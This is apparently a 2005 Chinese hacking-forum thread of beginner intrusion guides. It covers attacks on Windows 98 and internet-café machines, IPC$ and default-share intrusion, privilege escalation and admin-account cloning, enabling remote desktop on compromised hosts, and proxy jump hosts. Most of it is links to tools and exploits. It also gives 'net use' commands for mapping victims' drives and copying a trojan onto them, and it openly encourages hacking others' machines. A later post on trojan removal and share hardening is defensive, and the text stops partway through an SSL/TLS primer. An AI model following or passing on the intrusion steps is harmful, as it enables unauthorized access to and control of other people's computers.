telnet命令简介：http://www22.brinkster.com/lastknife/netbase/telnetorder.htm （以上地址简单介绍了TELNET命令，http://www.sixthroom.com/ailan/f ... 2&RootID=277&ID=277 
net命令基本用法：http://www.yy0730.com/1/1/1/wen/list.asp?id=12 
tftp命令： 由于TFTP命令过于简单，请自行使用“TFTP /？”进行查询。下面在给出一个参照的 
实例：http://levinstorm.myetang.com/main/tutorials/hacking/006.html 
一般入侵所需要的几个常用命令： 
http://www.yixindz.com/badschool/hacker/hack_commands.htm 
Linux 的常用网络命令 
http://www.jiejingwang.com/list.asp?id=522 


菜鸟进阶（5） 

关于windows98 


简单说明： 
这类问题有两种：一是怎样入侵win98系统，二是在win98怎样入侵。 
由于98的网络功能并不完善，使得问题的解决远没有像对2000那样“丰富多采”。98默认没有什么网络服务启动，众所周知漏洞是由于各种服务的功能设计并不完美,所以才产生的,也就是说没有漏洞也就很难入侵,找不到什么可利用的漏洞。这给入侵带来的困难是难以想像的.共享入侵,算是最常见的攻击方式了。 

相关资料: 
共享入侵 http://www.sixthroom.com/ailan/f ... 2&RootID=269&ID=269 
入侵windows98系统 http://www.sixthroom.com/ailan/f ... 2&RootID=270&ID=270 
win98入侵网吧详解 http://www.sixthroom.com/ailan/f ... 2&RootID=271&ID=271 

其实还有些方法，比如嗅探密码、发病毒和木马到信箱、甚至用QQ“联络感情”再传个绑木马的Flash等，没什么意思，就此打住（这是前辈说的,他老人家都说打住了,哪我也打住，其实是我也不知道说什么，呵呵）。 
基于同样的理由，98不是一个好的攻击平台。如果只是端口扫描，那么superscan可以胜任。web类的漏洞扫描x-scan也可以。但涉及ipc$的弱口令、漏洞、远程控制工具以及连接一些服务（如sql）就要“基于NT技术构建”的os了。好在3389终端服务的客户端可以是98，所以先搞一台开3389的肉鸡就算是回避了问题。如果你还在用98，诚恳的建议你：请用2000。如果你在网吧，先试试入侵网吧服务器。（在这里我也要加一句就是如果你是用98系统的话，哪么选择榕哥的流光98版也是不错的。不过有很多功能也还是无法使用）。 
鉴于98的问题技术含量不高、没有深入探讨价值，所以就谈到这里吧。（个人观点） 

相关工具： 
NetPass 1.0 破解98共享密码 http://lovezxd.myetang.com/indexpage/indextool/NetPass.zip 
cain v2.5 综合破解工具 http://www.qq888.com/down/download.asp?Did=968 
exeBinderZ 1.3 EXE捆绑机 http://www.heibai.net/download/show.php?id=3028&down=3 
SUPERSCAN3.0中文版下载 http://download.pchome.net/php/d ... erscanv30.exe&svr=3 
X-SCAN2.3下载 http://www.xfocus.net/download.php?id=366 
流光98下载 http://www.netxeyes.com/cfluxay2k1for98set...妥约喝フ野桑?/a> 
终端服务客户端 http://arm.533.net/hack/winterminal.zip （既3389连接器） 

第6章------关于ipc$、空连接和默认共享 
简单说明： 
******首先需要指出的是空连接和ipc$是不同的概念。空连接是在没有信任的情况下与服务器建立的会话，换句话说，它是一个到服务器的匿名访问。ipc$是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限。有许多的工具必须用到ipc$。默认共享是为了方便远程管理而开放的共享，包含了所有的逻辑盘（c$,d$,e$……）和系统目录winnt或windows（admin$）。******个人认为这段很重要，因为很多人根本就不知道什么是空连接什么是IPC$.建议不知道的朋友仔细看一下吧.这种问题,不应该不知道的. 


相关帖子： 
拒绝背后黑手的窥探 IPC$漏洞大揭秘 
http://www.sixthroom.com/ailan/f ... 2&RootID=281&ID=281 
IPC入侵全攻略 http://www.sixthroom.com/ailan/f ... 2&RootID=278&ID=278 
win2k中C驱等的默认共享是怎么回事 
http://www.sixthroom.com/ailan/f ... 2&RootID=282&ID=282 
取消默认共享≠安全 http://js00.51.net/23/wudi/show. ... p;id=20021017212524 


常见问题和回答： 
一、怎样建立空连接，它有什么用？ 
答：使用命令 net use \IPipc$ "" /user:"" 就可以简单地和目标建立一个空连接（需要目标开放ipc$）。 
对于NT，在默认安全设置下，借助空连接可以列举目标用户、共享，访问everyone权限的共享，访问小部分注册表等，没有什么利用价值。对2000作用就更小了。而且实现也不方便，需借助工具。如果你不理解“没用”的东西为什么还会存在，就看看“专业”的解释吧： 
在NT/2000下的空连接 http://www.sixthroom.com/ailan/f ... 2&RootID=280&ID=280 
解剖WIN2K下的空会话 http://www.sixthroom.com/ailan/f ... 2&RootID=283&ID=283 
二、为什么我连不上IPC$？ 
答：1，只有nt/2000/xp及以上系统才可以建立ipc$。如果你用的是98/me是没有该功能的。 
2、确认你的命令没有打错。正确的命令是： net use \目标IPipc$ "密码" /user:"用户名" 
注意别多了或少了空格。当用户名和密码中不包含空格时两边的双引号可以省略。空密码用""表示。 
3，根据返回的错误号分析原因： 
错误号5，拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限； 
错误号51，Windows 无法找到网络路径 : 网络有问题； 
错误号53，找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； 
错误号67，找不到网络名 ： 你的lanmanworkstation服务未启动；目标删除了ipc$； 
错误号1219，提供的凭据与已存在的凭据集冲突 ： 你已经和对方建立了一个ipc$，请删除再连。 
错误号1326，未知的用户名或错误密码 ： 原因很明显了； 
错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动。（连接域控会出现此情况） 
错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。 
4，关于ipc$连不上的问题比较复杂，本论坛没有总结出一个统一的认识，我在肉鸡上实验有时会得出矛盾的结论，十分棘手。而且知道了问题所在，如果没有用其他办法获得shell，很多问题依然不能解决。问题过于细致后就不适合在本文章里探讨了。各位看着办吧，呵呵。 
三、怎样打开目标的IPC$？ 
答：首先你需要获得一个不依赖于ipc$的shell，比如sql的cmd扩展、telnet、木马。当然，这shell必须是admin权限的。然后你可以使用shell执行命令 net share ipc$ 来开放目标的ipc$。从上一问题可以知道，ipc$能否使用还有很多条件。请确认相关服务都已运行，没有就启动它（不知道怎么做的请看net命令的用法）。还是不行的话（比如有防火墙，杀不了）建议放弃。 
四、怎样映射和访问默认共享？ 
答：使用命令net use z: \目标IPc$ 密码" /user:"用户名" 将对方的c盘映射为自己的z盘，其他盘类推。 
如果已经和目标建立了ipc$，则可以直接用IP加盘符加$访问。比如 copy muma.exe \IPd$pathmuma.exe 。或者再映射也可以，只是不用用户名和密码了：net use y: \IPd$ 。然后 copy muma.exe y:pathmuma.exe 。当路径中包含空格时，须用""将路径全引住。 
五、如何删除映射和ipc$连接？ 
答：用命令 net use \IPipc$ /del 删除和一个目标的ipc$连接。 
用命令 net use z: /del 删除映射的z盘，其他盘类推。 
用命令 net use * /del 删除全部。会有提示要求按y确认。 
六、连上ipc$然后我能做什么？ 
答：能使用管理员权限的帐号成功和目标连接ipc$，表示你可以和对方系统做深入“交流”了。你可以使用各种命令行方式的工具（比如pstools系列、Win2000SrvReskit、telnethack等）获得目标信息、管理目标的进程和服务等。如果目标开放了默认共享（没开你就帮他开），你就可以上传木马并运行。也可以用tftp、ftp的办法上传。像dwrcc、VNC、RemoteAdmin等工具（木马）还具有直接控屏的功能。如果是2000server，还可以考虑开启终端服务方便控制。这里提到的工具的使用，请看自带的说明或相关教程。 
七、怎样防止别人用ips$和默认共享入侵我？ 
答：A、一种办法是把ipc$和默认共享都删除了。但重起后还会有。这就需要改注册表。 
1，先把已有的删除 
net share ipc$ /del 
net share admin$ /del 
net share c$ /del 
…………（有几个删几个） 
2，禁止建立空连接 
  首先运行regedit，找到如下主键[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlLSA]把RestrictAnonymous（DWORD）的键值改为：00000001。 
  3，禁止自动打开默认共享 
  对于server版，找到如下主键[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesLanmanServerParameters]把AutoShareServer（DWORD）的键值改为:00000000。 
对于pro版，则是[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesLanmanServerParameters]把AutoShareWks（DWORD）的键值改为:00000000。 
B、另一种是关闭ipc$和默认共享依赖的服务（不推荐） 
net stop lanmanserver 
可能会有提示说，XXX服务也会关闭是否继续。因为还有些次要的服务依赖于lanmanserver。一般情况按y继续就可以了。 
C、最简单的办法是设置复杂密码，防止通过ipc$穷举密码。但如果你有其他漏洞，ipc$将为进一步入侵提供方便。 
D、还有一个办法就是装防火墙，或者端口过滤。防火墙的方法就不说了，端口过滤看这里： 
过配置本地策略来禁止139/445端口的连接： 
http://www.sixthroom.com/ailan/f ... 2&RootID=284&ID=284 









--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:49am 

菜鸟进阶（6） 

关于扫描出的漏洞 

简单说明： 
很多扫描器都有漏洞扫描功能。当你获得了一些主机的漏洞列表时，不要急着把它们帖在论坛上，期望别人来为你分析和告诉你利用的方法。你应该首先尝试自己完成这些。扫描出的漏洞并不是都有用的，一部分漏洞过时了，一部分是误报。如果你希望了解的多一些，最好经常到发布漏洞比较快的网站走一走，漏洞的利用是一个不段积累的过程。时间长了相信你就体会到了。 


漏洞搜索： 

绿盟的引擎 http://www.nsfocus.net/index.php?act=sec_bug 
蓝盾的引擎 http://www.landun.org/zhongyao/sousuo.htm 
补天网的引擎 http://www.patching.net/otherweb/leak/leakindex.asp 
安全焦点的引擎 http://www.xfocus.net/vuln/index.php 
小凤居的引擎 http://lilitou1.myetang.com/ 


相关帖子： 
一个CGI漏洞的发现和利用 
http://www.sixthroom.com/ailan/f ... 2&RootID=285&ID=285 
cgi漏洞大全 http://www.sixthroom.com/ailan/f ... 2&RootID=293&ID=293 
常见CGI漏洞及应对二 http://www.sixthroom.com/ailan/f ... 2&RootID=286&ID=286 
常见CGI漏洞及应对一 http://www.sixthroom.com/ailan/f ... 2&RootID=287&ID=287 
Windows 2000漏洞集锦1 http://www.sixthroom.com/ailan/f ... 2&RootID=288&ID=288 
Windows 2000漏洞集锦2 http://www.sixthroom.com/ailan/f ... 2&RootID=289&ID=289 
Windows 2000漏洞集锦3 
http://www.sixthroom.com/ailan/f ... 2&RootID=290&ID=290 
Windows 2000漏洞集锦4 
http://www.sixthroom.com/ailan/f ... 2&RootID=291&ID=291 
Windows 2000漏洞集锦5 
http://www.sixthroom.com/ailan/f ... 2&RootID=292&ID=292 
ASP漏洞大全 http://www.sixthroom.com/ailan/f ... 2&RootID=294&ID=294 
IIS漏洞整理一 http://www.sixthroom.com/ailan/f ... 2&RootID=295&ID=295 
IIS漏洞整理二 http://www.sixthroom.com/ailan/f ... 2&RootID=296&ID=296 
中国网络安全响应中心各种漏洞大全 http://www.cns911.com/holes/linux/list.php 



第8章------关于提升权限 

简单说明： 
黑客的最终目标就是得到root（即win中的admin）权限。一个真正的黑客会把一次入侵当做是自己的一件作品,不会轻易放弃，但是有些漏洞（典型的如Unicode漏洞、ASP木马）不能直接获得管理员权限，所以必然需要提升权限。一些新手可能会犯这类错误，以为中了木马、获得了shell就能控制一切。结果就出现“为何不能加用户”、“为何不能开3389”等问题。2000及更高版本os承袭了NT的安全结构，多重机制环环相扣来保障安全，特别是帐户安全。无奈安全系统过于庞大，多少会出现漏洞，于是我们就有机会了。 还要补充一点，就是在拿到一个现成的后门软件，或是一个木马的时候，一定要先看看说明。至少你应该知道这个后门运行后的效果吧？更有些人上传了某个后门软件或是木马到目标后就认为完事了，你不执行它就是传个地雷上去又有什么用呢？ 


相关工具： 
erunasx 利用Debug Registers漏洞提升权限 http://www.qq888.com/down/download.asp?Did=796 
Windows NT/2000权限提升工具，可以将任意用户提升到SYSTEM级别的权限。漏洞出在smss.exe中的DEBUG子系统，所有普通用户都可以通过该漏洞获得对系统中任意进程或线程句柄的控制，从而可以以SYSTEM或管理员权限执行任意命令。2、使用方法：假设我们已经获得一台机器上的一个GUEST用户（或其他普通用户），现在我们要这个工具来获得系统最高权限。进行如下步骤：把ERunAsX.exe和ERunAsX.dll这两个文件复制到目标主机上可访问的目录下，例如C:下。以GUEST身份运行"ERunAsX 要执行命令"，例如"ERunAsX cmd.exe"，这时执行的命令是以SYSTEM 权限运行的...（请注意：具体使用以软件内英文说明为准，内附该BUG解决办法） 

PipeUpAdmin 对sp1及更低有效 http://maopao.com/down/download.asp?Did=69 
ISPC 利用IIS的漏洞，详见自带说明 http://www.cnsq.net/sq88/down/show.asp?id=572&down=1 
PHPBB论坛权限提升 http://www.newyouth.org/softdown ... .0.exploit_code.zip 
WIN帮助文件溢出（可用于XP） http://www.newyouth.org/softdown ... ack/chmoverflow.zip 
NT/2K权限提升工具GetAdmin下载 http://www.csdn.net/cnshare/soft/openfile.asp?kind=1&id=9807 


相关帖子： 
NT/2000提升权限的方法小结 http://www.sixthroom.com/ailan/f ... 2&RootID=297&ID=297 
关于WIN2000的入侵，以及安全防御等问题（文章包含一次利用U漏洞提高权限的过程） 
http://www.sixthroom.com/ailan/f ... 2&RootID=298&ID=298 
UNICODE漏洞介绍及入侵 
http://www.sixthroom.com/ailan/f ... 2&RootID=299&ID=299 
怎样提升权限，做后门 
http://www.sixthroom.com/ailan/f ... 2&RootID=300&ID=300 
一般用户获取NT服务器Admin权限的方法 
http://www.sixthroom.com/ailan/f ... 2&RootID=302&ID=302 
Windows NT4的安全结构（对新手有些难，了解一下吧） http://www.sixthroom.com/ailan/f ... 3&RootID=303&ID=303 


菜鸟进阶（7） 

关于做代理和跳板 

简单介绍： 
代理服务器英文全称是Proxy Cerver，其功能就是代理网络用户去取得网络信息。形象的说：它是网络信息的中转站。在一般情况下，我们使用网络浏览器直接去连接其他Internet站点取得网络信息时，须送出Request信号来得到回答，然后对方再把信息以bit方式传送回来。代理服务器是介于浏览器和Web服务器之间的一台服务器，有了它之后，浏览器不是直接到Web服务器去取回网页而是向代理服务器发出请求，Request信号会先送到代理服务器，由代理服务器来取回浏览器所需要的信息并传送给你的浏览器。而且，大部分代理服务器都具有缓冲的功能，就好象一个大的Cache，它有很大的存储空间，它不断将新取得数据储存到它本机的存储器上，如果浏览器所请求的数据在它本机的存储器上已经存在而且是最新的，那么它就不重新从Web服务器取数据，而直接将存储器上的数据传送给用户的浏览器，这样就能显著提高浏览速度和效率。更重要的是：Proxy Server (代理服务器)是 Internet链路级网关所提供的一种重要的安全功能，它的工作主要在开放系统互联 (OSI) 模型的对话层，有了对代理的了解，相信你也认识到了什么是跳板。 


相关工具： 
SocksCap 2.2 SOCKS调度工具 http://www.123gz.com/dzc/download/sc32r231.exe 
SkSockServer1.04 代理跳板 http://www.123gz.com/dzc/download/sksockserver.zip 
Snake跳板傻瓜版 http://www.123gz.com/dzc/download/sgtb.zip 
代理猎手V3.1Beta1简装版 http://www.123gz.com/dzc/download/proxyhunter.zip 
FTP Serv-U 4.0 正式汉化版，最常用的ftp服务程序 http://61.159.224.188/makesoftur ... 627E207574756375737 
slimftp 隐蔽的ftp服务器 http://www.whitsoftdev.com/files/slimftpd.zip 
天雁WEB服务器 不用安装的小型web服务程序 http://www.cnzzz.com/download/do ... 33352254709&Url=100 
多种服务程序下载 
http://www.zdnet.com.cn/download/windows/b...r,00.htm?sort=5 


相关帖子： 
代理、肉鸡、跳板的概念 http://www.sixthroom.com/ailan/f ... 2&RootID=305&ID=305 
代理服务器(Proxy)完全解析 http://www.sixthroom.com/ailan/f ... 2&RootID=307&ID=307 
如何使用代理服务器 http://www.sixthroom.com/ailan/f ... 2&RootID=309&ID=309 
简单制作跳板 http://www.123gz.com/dzc/sksockserver-cusky.htm 
Serv-U设置教程 http://www.enanshan.com/ftp/ 
SocksCap32 使用详解 http://www.123gz.com/dzc/sockscap32.htm 
在肉鸡上安装FTP服务器 http://www.sixthroom.com/ailan/f ... 2&RootID=306&ID=306 
利用 unicode 漏洞，轻松建立自己的代理服务器 
http://www.123gz.com/dzc/sksockserver-nicky-1.htm#top1 
特别推荐猎手与蚂蚁收藏馆 http://www.123gz.com/ （绝对值得一看） 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:50am 

菜鸟进阶（8） 

关于终端服务(3389) 
简单说明： 
windows终端服务提供了通过作为终端仿真器工作的“瘦客户机”软件远程访问服务器桌面的能力。图形界面和不影响当前本地用户的特性是它的最大优点。由于它是2000server及以上版本自带的功能，因此成为一个绝好的“后门”而倍受青睐。而且win98也可以成为客户端，这使得在网吧“工作”成为可能。有一点需要强调一下使用客户端登陆远程主机对当前工作的用户没有影响，而且一切动作本地用户都是看不到的。也就是说远程登陆和本地用户是在不相同的空间，两者互不干扰。 


相关工具： 
WIN2000客户端 
http://zudu2000.myetang.com/soft/win2k.rar 
winxp下的客户端 功能比2000下的更强大 
http://zudu2000.myetang.com/soft/windowsXP.zip 
终端服务程序的一个补丁 使本地和远程间能复制文本 http://www.sandflee.net/wawa/tools/rdpclip_hotfix.exe 
web版终端客户端 使用浏览器调用ActiveX控件访问终端服务 
http://www.enanshan.com/down/tswebsetup.exe 
C3389.EXE 修改终端服务端口号的工具 
http://www.sandflee.net/down/show.asp?id=228&down=1 
Win2k终端服务器端所需文件包 
http://www.netsill.com/download/download.asp?Did=1965 
3389自动安装程序-djshao正式版5.0 
http://netsill.com/download/download.asp?Did=2019 
开启3389工具（如果要想让远程主机开启WIN2000的终端服务，请把3389.exe也传到远程主机上并运行。然后等待一个漫长的时间（由于是无人执守安装）。就可以看到远程主机的3389端口会被打开。） 
http://netsill.com/download/download.asp?Did=1991 
W2K终端服务客户端安装版 
http://www.sandflee.net/down/show.asp?id=39&down=1 


相关帖子： 
关于远程启动终端服务的帖子 http://www.sixthroom.com/ailan/f ... 2&RootID=385&ID=385 
终端服务问题常见问答 
http://www.sixthroom.com/ailan/f ... 2&RootID=386&ID=386 
图文讲解输入法漏洞入侵 
http://www.sandflee.net/txt/list.asp?id=22 
3389自动安装工具教程 
http://netsill.com/download/download.asp?Did=2068 
3389动画教程（密码china） 
http://netsill.com/download/download.asp?Did=1990 
修改终端客户端端口动画教程 
http://netsill.com/download/download.asp?Did=2009 
3389资料 http://www21.brinkster.com/srob/wawa/wawa/3389txt.htm 

菜鸟进阶（9） 


关于克隆帐号 


简单说明： 
克隆帐号的原理简单的说是这样：在注册表中有两处保存了帐号的SID相对标志符,一处是SAMDomainsAccountUsers下的子键名，另一处是该子键的子项F的值中。这里微软犯了个不同步它们的错误，登陆时用的是后者，查询时用前者。当用admin的F项覆盖其他帐号的F项后，就造成了帐号是管理员权限但查询还是原来状态的情况。即所谓的克隆帐号。（前辈就是前辈把大家想到的都写出来了，我实在不知道这里在加些什么了。看来也只有这样了。大家如果还有什么不明白的就到论坛里发贴子吧。 
具体的看这里： 
解剖安全帐号管理器（SAM）结构 http://www.sixthroom.com/ailan/f ... 3&RootID=387&ID=387 
明白原理后就可以手动或者用现成的工具克隆帐号了。 


相关工具： 
克隆ca.exe http://www.netxeyes.org/CA.exe 
检查克隆cca.exe http://www.netxeyes.org/CCA.exe 
手动克隆需要SYSTEM权限，用它 psu.exe 
http://www.sandflee.net/down/show.asp?id=176&down=1 

相关帖子： 
工具克隆：ca和cca 请访问作者主页 http://www.netxeyes.org/main.html 
psu用法：psu.exe提升为system权限 http://www.sixthroom.com/ailan/f ... 2&RootID=390&ID=390 
手动克隆：如何克隆管理员帐号 http://www.sixthroom.com/ailan/f ... 3&RootID=388&ID=388 
如何克隆管理员帐号的补充 http://www.sixthroom.com/ailan/f ... 3&RootID=389&ID=389 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:51am 

木马防范及一些端口的关闭 

　一、防范木马应该注意的一些问题 
　　1、不到不受信任的网站上下载软件运行
　　2、不随便点击来历不明邮件所带的附件
　　3、及时安装相应的系统补丁程序
　　4、为系统选用合适的正版杀毒软件，并及时升级相关的病毒库
　　5、为系统所有的用户设置合理的用户口令 

　　口令设置要求：
　　1.口令应该不少于8个字符；
　　2.不包含字典里的单词、不包括姓氏的汉语拼音；
　　3.同时包含多种类型的字符，比如　　
　　o大写字母(A,B,C,..Z)
　　o小写字母(a,b,c..z)
　　o数字(0,1,2,…9)
　　o标点符号(@,#,!,$,%,& …) 

　　win2000口令设置方法: 

　　当前用户口令：在桌面环境下按crtl+alt+del键后弹出选项单，选择其中的更改密码项后按要求输入你的密码（注意：如果以前administrator没有设置密码的话，旧密码那项就不用输入，只需直接输入新的密码）。 

　　其他用户口令：
　　在开始->控制面板->用户和密码->选定一个用户名->点击设置密码 

　　二、检查和清除木马可能会使用到命令 

　　1、如何进入命令行方式？ 

　　win98下在开始-->运行中输入command点确定
　　winnt、win2000、winxp下在开始-->运行中输入cmd后点确定 

　　2、如何使用netstat命令？ 

　　netstat是用来显示网络连接、路由表和网络接口信息的命令，使用方法是在命令行下输入netstat -an后回车，输出结果格式如下：
　　Active Connections
　　Proto Local Address Foreign Address State
　　TCP 0.0.0.0:135 0.0.0.0:0 LISTENING
　　TCP 0.0.0.0:445 0.0.0.0:0 LISTENING
　　TCP 0.0.0.0:1025 0.0.0.0:0 LISTENING
　　TCP 0.0.0.0:1026 0.0.0.0:0 LISTENING
　　UDP 0.0.0.0:445 *:*
　　UDP 0.0.0.0:2967 *:*
　　UDP 0.0.0.0:38037 *:*
　　这其中Proto项代表是协议类型，Local Address项代表的是本地IP地址和端口（冒号后面为端口号），Foreign Address项代表的是外部IP地址和端口,State表示的是当前状态。上面这个结果表示这台机器开放了TCP的135、445、1025和1026端口，UDP的445、2967和38027端口 

　　3、如何使用Fport命令？ 

　　Fport是查看系统进程与端口关联的命令，使用方法是在命令行方式下输入Fport后回车，输出结果格式如下： 

　　Pid Process Port Proto Path
　　472 svchost -> 135 TCP C:\WINNT\system32\svchost.exe
　　8 System -> 445 TCP
　　580 MSTask -> 1025 TCP C:\WINNT\system32\MSTask.exe
　　8 System -> 1026 TCP
　　8 System -> 445 UDP
　　444 rtvscan -> 2967 UDP C:\Program Files\NavNT\rtvscan.exe
　　812 MsgSys -> 38037 UDP C:\WINNT\System32\MsgSys.EXE 

　　这其中port下面代表的是系统当前开放的端口而path下面列出的是与该端口关联的程序及其所在位置。
　　从上面这个结果看，系统上135、445端口是与C:\winnt\system32\svchost.exe程序关联的1025、1026、445（udp)端口与　　　　　　　　c:\winnt\system32\mstask.exe程序关联的2967(udp)端口是与C:\Program Files\NavNT\rtvscan.exe程序关联的38027(udp)端口是与　　C:\WINNT\System32\MsgSys.EXE程序关联的 

　　注：fport仅适用于winnt、win2000和winxp，在win98下无法使用 

　　 4、如何编辑注册表？ 

　　请在开始--〉运行中输入regedit后点确定进入注册表编辑状态。注册表编辑框左边显示的是注册表的项，右边显示的是注册的键值，要删除键值请点中该键值后点右键选择其中的删除。要修改键值请点中该键值后点鼠标右键选择修改。要删除项请选中该项后点右键选删除。 

　　5、如何关闭服务？ 

　　开始-->控制面版-->管理工具-->服务进入服务管理工具，选中要关闭的服务后点右键选停止
　　注：上面方法仅适用于WINNT、WIN2000和WINXP 

　　6、如何进入安全模式？ 

　　系统启动时按F8 

　　7、如何杀进程？ 

　　win98下按ALT+CTRL+DEL，在弹出的对话框中选中你要结束的进程后点关闭，winnt、win2000和winxp下按ALT+CTRL+DEL弹出窗口后选择任务管理器，在进程一项里选中你要结束的进程后点击结束进程 

　　三、常见木马及控制软件的服务端口与关闭方法 

　　注意：下文中提到的相关路径根据您的操作系统版本不同会有所不同，请根据自己的系统做相应的调整
　　win98系统： c:\windows c:\windows\system
　　winnt和win2000系统： c:\winnt c:\winnt\system32
　　winxp系统： c:\windows c:\windows\system32
根据系统安装的路径不同，目录所在盘符也可能不同，如系统安装在D盘，请将C:\windows改为D:\windows依此类推大部分的木马程序都可以改变默认的服务端口，我们应该根据具体的情况采取相应的措施，一个完整的检查和删除过程如下例所示： 

　　例：113端口木马的清除（仅适用于windows系统）：
　　这是一个基于irc聊天室控制的木马程序。 

　　1.首先使用netstat -an命令确定自己的系统上是否开放了113端口 

　　2.使用fport命令察看出是哪个程序在监听113端口
　　例如我们用fport看到如下结果：
　　Pid Process Port Proto Path
　　392 svchost -> 113 TCP C:\WINNT\system32\vhos.exe 

　　我们就可以确定在监听在113端口的木马程序是vhos.exe而该程序所在的路径为
　　c:\winnt\system32下。 

　　3.确定了木马程序名（就是监听113端口的程序）后，在任务管理器中查找到该进程，并使用管理器结束该进程。 

　　4.在开始-运行中键入regedit运行注册表管理程序，在注册表里查找刚才找到那个程序，并将相关的键值全部删掉。 

　　5.到木马程序所在的目录下删除该木马程序。（通常木马还会包括其他一些程序，如，rscan.exe、psexec.exe、ipcpass.dic、ipcscan.txt等，根据木马程序不同，文件也有所不同，你可以通过察看程序的生成和修改的时间来确定与 监听113端口的木马程序有关的其他程序） 

　　6.重新启动机器。 

　　以下列出的端口仅为相关木马程序默认情况下开放的端口，请根据具体情况采取相应的操作： 

　　707端口的关闭：
　　这个端口开放表示你可能感染了nachi蠕虫病毒，该蠕虫的清除方法如下：
　　停止服务名为WINS Client和Network Connections Sharing的两项服务
　　删除c:\winnt\SYSTEM32\WINS\目录下的DLLHOST.EXE和SVCHOST.EXE文件
　　编辑注册表，删除HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services项中名为RpcTftpd和RpcPatch的两个键值 

　　1999端口的关闭：
　　这个端口是木马程序BackDoor的默认服务端口，该木马清除方法如下：
　　使用进程管理工具将notpa.exe进程结束
　　删除c:\windows\目录下的notpa.exe程序
　　编辑注册表，删除HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run项中包含c:\windows\notpa.exe /o=yes的键值 

　　2001端口的关闭：
　　这个端口是木马程序黑洞2001的默认服务端口，该木马清除方法如下：
　　首先使用进程管理软件将进程windows.exe杀掉
　　删除c:\winnt\system32目录下的windows.exe和S_Server.exe文件
　　编辑注册表，删除将HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\项中名为windows的键值
　　将HKEY_CLASSES_ROOT和HKEY_LOCAL_MACHINE\Software\CLASSES项中的Winvxd项删除
　　修改HKEY_CLASSES_ROOT\txtfile\shell\open\command项中的c:\winnt\system32\S_SERVER.EXE %1为C:\WINNT\NOTEPAD.EXE %1
　　修改HKEY_LOCAL_MACHINE\Software\CLASSES\txtfile\shell\open\command项中的c:\winnt\system32\S_SERVER.EXE %1键值改为C:\WINNT\NOTEPAD.EXE %1 

　　2023端口的关闭：
　　这个端口是木马程序Ripper的默认服务端口，该木马清除方法如下：
　　使用进程管理工具结束sysrunt.exe进程
　　删除c:\windows目录下的sysrunt.exe程序文件
　　编辑system.ini文件，将shell=explorer.exe sysrunt.exe 改为shell=explorer.exe后保存
　　重新启动系统 

　　2583端口的关闭：
　　这个端口是木马程序Wincrash v2的默认服务端口，该木马清除方法如下：
　　编辑注册表，删除HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\项中的WinManager = 　"c:\windows\server.exe"键值
　　编辑win.ini文件，将run=c:\windows\server.exe改为run=后保存退出
　　重新启动系统后删除C:\windows\system\ SERVER.EXE 

　　3389端口的关闭：
　　首先说明3389端口是windows的远程管理终端所开的端口，它并不是一个木马程序，请先确定该服务是否是你自己开放的。如果不是必须的，请关闭该服务。 

　　win2000关闭的方法：win2000server 开始-->程序-->管理工具-->服务里找到Terminal Services服务项，
　　选中属性选项将启动类型改成手动，并停止该服务。
　　win2000pro 开始-->设置-->控制面板-->管理工具-->服务里找到Terminal Services服务项，选中属性选项将启动类型改成手动，并停止该服务。
　　winxp关闭的方法：在我的电脑上点右键选属性-->远程，将里面的远程协助和远程桌面两个选项框里的勾去掉。 

　　4444端口的关闭：
　　如果发现你的机器开放这个端口，可能表示你感染了msblast蠕虫，清除该蠕虫的方法如下：
　　使用进程管理工具结束msblast.exe的进程
　　编辑注册表，删除HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run项中的"windows auto update"="msblast.exe"键值
　　删除c:\winnt\system32目录下的msblast.exe文件 


　　4899端口的关闭：
　　首先说明4899端口是一个远程控制软件（remote administrator)服务端监听的端口，他不能算是一个木马程序，但是具有远程控制功能，通常杀毒软件是无法查出它来的，请先确定该服 务是否是你自己开放并且是必需的。如果不是请关闭它。 

　　关闭4899端口：
　　请在开始-->运行中输入cmd(98以下为command),然后cd C:\winnt\system32(你的系统安装目录），输入r_server.exe /stop后按回车。然后在输入r_server /uninstall /silence 到C:\winnt\system32(系统目录）下删除r_server.exe admdll.dll raddrv.dll三个文件 


　　5800，5900端口：
　　首先说明5800，5900端口是远程控制软件VNC的默认服务端口，但是VNC在修改过后会被用在某些蠕虫中。
　　请先确认VNC是否是你自己开放并且是必须的，如果不是请关闭 

　　关闭的方法：
　　首先使用fport命令确定出监听在5800和5900端口的程序所在位置（通常会是c:\winnt\fonts\explorer.exe)
　　在任务管理器中杀掉相关的进程（注意有一个是系统本身正常的，请注意！如果错杀可以重新运行c:\winnt\explorer.exe)
　　删除C:\winnt\fonts\中的explorer.exe程序。
　　删除注册表HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run项中的Explorer键值。
　　重新启动机器。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:51am 

SSL.TLS.WTLS原理（上） 

一 前言 

首先要澄清一下名字的混淆： 
1 SSL(Secure Socket Layer)是netscape公司设计的主要用于web的安全传输协议 

。这种协议在WEB上获得了广泛的应用。 
2 IETF(www.ietf.org)将SSL作了标准化，即RFC2246,并将其称为TLS（Transport 

Layer Security），从技术上讲，TLS1.0与SSL3.0的差别非常微小。由于本文中 

没有涉及两者间的细小差别，本文中这两个名字等价。 
3 在WAP的环境下，由于手机及手持设备的处理和存储能力有限，wap论坛（ 

www.wapforum.org）在TLS的基础上做了简化，提出了WTLS协议（Wireless 

Transport Layer Security），以适应无线的特殊环境。 

我们从各式各样的文章中得知，SSL可以用于保密的传输，这样我们与web server 

